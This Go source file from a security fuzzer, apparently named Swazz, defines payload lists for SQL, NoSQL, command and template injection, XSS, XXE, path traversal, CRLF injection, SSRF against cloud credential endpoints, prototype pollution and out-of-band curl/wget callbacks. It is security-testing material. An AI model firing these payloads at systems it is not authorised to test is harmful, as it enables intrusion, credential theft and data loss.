// Copyright (c) 2026 Swazz Authors
// This file is part of Swazz
// Swazz is licensed under the Business Source License 1.1 (BSL 1.1)
// See the LICENSE file in the project root or visit https://github.com/SecH0us3/swazz for more details

package payloads

import "math"

// ─── Null bytes & Encoding attacks ──────────────────────

var maliciousEncoding = []string{
	"\x00",                                 // Null byte
	"\x00\x00\x00\x00",                     // Multiple null bytes
	"\r\n\r\n",                             // CRLF injection
	"\r\n",                                 // Carriage return + newline
	"\t\b\f",                               // Control characters
	"\u200B",                               // Zero-width space
	"\u200E\u200F",                         // LTR/RTL marks
	"\uFEFF",                               // BOM character
	"\uFFFD",                               // Replacement character
	"test\x00injected",                     // Null byte in middle
	"normal\r\nX-Injected: header",         // Header injection
	"normal\r\nSet-Cookie: sessionid=evil", // Cookie injection via CRLF
	"normal%0d%0aLocation:%20http://attacker.com", // Open redirect via CRLF
	"test%u000d%u000aX-Injected: unicode",         // Microsoft IIS Unicode CRLF
	"%E5%98%8D%E5%98%8AX-CRLF-Bypass:yes",         // PayloadsAllTheThings UTF-8 CRLF bypass
	"%00%0a%0d",                                   // URL-encoded control chars
	"\u202E\u0041\u0042\u0043",                    // Right-to-left override
}

// ─── SQL Injection payloads ─────────────────────────────

var maliciousSQLi = []string{
	"' OR 1=1 --",
	"' OR '1'='1",
	"'; DROP TABLE users;--",
	"1; SELECT * FROM information_schema.tables",
	"' UNION SELECT NULL, NULL, NULL --",
	"1' AND SLEEP(5)--",
	"admin'--",
	"' OR 1=1#",
	"1; EXEC xp_cmdshell('whoami')",
	"' WAITFOR DELAY '0:0:5'--",
	"1 OR 1=1",
	"' AND 1=CONVERT(int, (SELECT @@version))--",
}

// ─── XSS payloads ───────────────────────────────────────

var maliciousXSS = []string{
	"<script>alert(1)</script>",
	"<svg/onload=alert(1)>",
	"<img src=x onerror=alert(1)>",
	"<body onload=alert(1)>",
	`"><script>alert(document.cookie)</script>`,
	"javascript:alert('XSS')",
	`<iframe src="javascript:alert(1)">`,
	"<details open ontoggle=alert(1)>",
	`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`,
	`{{constructor.constructor("return this")().alert(1)}}`,
	`"><svg/onload=alert(1)>`,
	`'-alert(1)-'`,
	`\x3cscript\x3ealert(1)\x3c/script\x3e`,
	`%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
}

// ─── Path Traversal ─────────────────────────────────────

var maliciousPathTraversal = []string{
	"../../../../etc/passwd",
	`..\\..\\..\\..\\windows\\system32\\config\\sam`,
	"....//....//....//etc/passwd",
	"/etc/shadow",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"file:///etc/passwd",
	"..%c0%af..%c0%af..%c0%afetc/passwd",
	"%252e%252e%252fetc%252fpasswd",
}

// ─── OOB Interaction Payloads ───────────────────────────

var maliciousOOB = []string{
	"{{OOB_URL}}",
	"curl {{OOB_URL}}",
	"wget {{OOB_URL}}",
	"<script src=\"{{OOB_URL}}\"></script>",
}

// ─── Type confusion values ──────────────────────────────

var MaliciousTypeConfusion = []any{
	nil,
	[]any{},
	map[string]any{},
	"NaN",
	[]any{nil},
	map[string]any{"toString": "not a function"},
	[]any{1, []any{2, []any{3, []any{4}}}},
	"",
	0,
	false,
	-1,
}

// ─── Number abuse ───────────────────────────────────────

var MaliciousNumbers = []any{
	"NaN",
	math.Inf(1),
	math.Inf(-1),
	"1e500",
	"0x0",
	"0o0",
	"0b0",
	1.0000000000000002,
	-0.0,
	math.Inf(1), // Infinity (was MaxFloat64 * 2 in TS)
	1e-400,
	"99999999999999999999999999999",
}

// ─── Date abuse ─────────────────────────────────────────

var MaliciousDates = []any{
	"2023-02-29T00:00:00.000Z",
	"2023-13-32T25:61:61.000Z",
	"10000-01-01T00:00:00.000Z",
	"not-a-date",
	"",
	"0",
	"999999999999",
	"2023-00-00",
	"-001-01-01T00:00:00.000Z",
}

// ─── Boolean abuse ──────────────────────────────────────

var MaliciousBooleans = []any{
	"true",
	"false",
	1,
	0,
	nil,
	"yes",
	"no",
	"",
	"TRUE",
	"1",
	"0",
	[]any{},
}

// ─── Aggregate: all string-type malicious payloads ──────

var maliciousCmdi = []string{
	"; id",
	"| id",
	"; whoami",
	"& whoami",
	"|| id",
	"&& id",
	"|| whoami",
	"&& whoami",
	"`id`",
	"$(id)",
	"|cat /etc/passwd",
	";cat /etc/passwd",
}

var maliciousSSTI = []string{
	"{{7*7}}",
	"${7*7}",
	"<%= 7*7 %>",
	"#{7*7}",
	"{{7+'7'}}",
	"${{7*7}}",
	"*{7*7}",
	"@[7*7]",
	"{{config.items()}}",
	"${T(java.lang.Runtime).getRuntime().exec('id')}",
	"{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
}

var maliciousXXE = []string{
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:80/evil.dtd">%remote;]><root/>`,
	`<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://127.0.0.1/test.xml" >]><foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>`,
}

var maliciousPrototypePollution = []string{
	`{"__proto__":{"polluted":"true"}}`,
	`{"constructor":{"prototype":{"polluted":"true"}}}`,
	`__proto__[polluted]=true`,
	`constructor.prototype.polluted=true`,
	`{"__proto__":{"isAdmin":true}}`,
	`{"__proto__":{"status":"admin"}}`,
	`__proto__.polluted=yes`,
	`{"__proto__":{"role":"admin"}}`,
	`constructor[prototype][polluted]=true`,
	`{"__proto__":{"auth":true}}`,
	`constructor.prototype.isAdmin=true`,
	`{"__proto__":{"__proto__":{"polluted":"true"}}}`,
}

var maliciousNoSQLi = []string{
	`{"$ne": null}`,
	`{"$gt": ""}`,
	`{"$regex": ".*"}`,
	`{"$where": "sleep(5000)"}`,
	`{"$or": [{}, {"a":"a"}]}`,
	`[$ne]=1`,
	`{"$exists": true}`,
	`{"$nin": []}`,
	`{"$ne": ""}`,
	`{"$where": "this.password.match(/.*)/"}`,
	`{"$type": "string"}`,
	`{ "$elemMatch": { "$ne": null } }`,
	`{"$regex": "^.*"}`,
}

var maliciousSSRF = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://169.254.169.254/metadata/v1/",
	"http://169.254.169.254/latest/dynamic/instance-identity/document",
	"file:///etc/hosts",
	"http://0/",
	"http://127.0.0.1:80/",
	"http://localhost:22/",
	"2130706433",
	"0177.0.0.1",
	"0",
}

var maliciousMassAssignment = []string{
	`{"role":"admin"}`,
	`{"is_admin":true}`,
	`{"permissions":["*"]}`,
	`{"tier":"premium"}`,
	`{"verified":true}`,
	`{"role_id":1}`,
	`{"status":"active"}`,
}

var maliciousGraphQL = []string{
	`{"query":"query { __schema { queryType { name } } }"}`,
	`{"query":"query { __type(name: \"User\") { name fields { name } } }"}`,
	`{"query":"query { user(id: 1) { passwrd } }"}`,
	`[{"query":"query{__typename}"},{"query":"query{__typename}"},{"query":"query{__typename}"}]`,
	`{"query":"query { __schema { types { name fields { name type { name kind } } } } }"}`,
	`{"query":"query { user { id user { id user { id user { id } } } } }"}`,
	`{"query":"fragment f on User { id } query { ...f ...f ...f ...f }"}`,
}

var AllMaliciousStrings []any

func init() {
	all := make([]any, 0, len(maliciousEncoding)+len(maliciousSQLi)+len(maliciousXSS)+len(maliciousPathTraversal)+len(maliciousCmdi)+len(maliciousSSTI)+len(maliciousXXE)+len(maliciousOOB)+len(maliciousPrototypePollution)+len(maliciousNoSQLi)+len(maliciousSSRF)+len(maliciousMassAssignment)+len(maliciousGraphQL))
	for _, s := range maliciousEncoding {
		all = append(all, s)
	}
	for _, s := range maliciousSQLi {
		all = append(all, s)
	}
	for _, s := range maliciousXSS {
		all = append(all, s)
	}
	for _, s := range maliciousPathTraversal {
		all = append(all, s)
	}
	for _, s := range maliciousCmdi {
		all = append(all, s)
	}
	for _, s := range maliciousSSTI {
		all = append(all, s)
	}
	for _, s := range maliciousXXE {
		all = append(all, s)
	}
	for _, s := range maliciousOOB {
		all = append(all, s)
	}
	for _, s := range maliciousPrototypePollution {
		all = append(all, s)
	}
	for _, s := range maliciousNoSQLi {
		all = append(all, s)
	}
	for _, s := range maliciousSSRF {
		all = append(all, s)
	}
	for _, s := range maliciousMassAssignment {
		all = append(all, s)
	}
	for _, s := range maliciousGraphQL {
		all = append(all, s)
	}
	AllMaliciousStrings = all
}
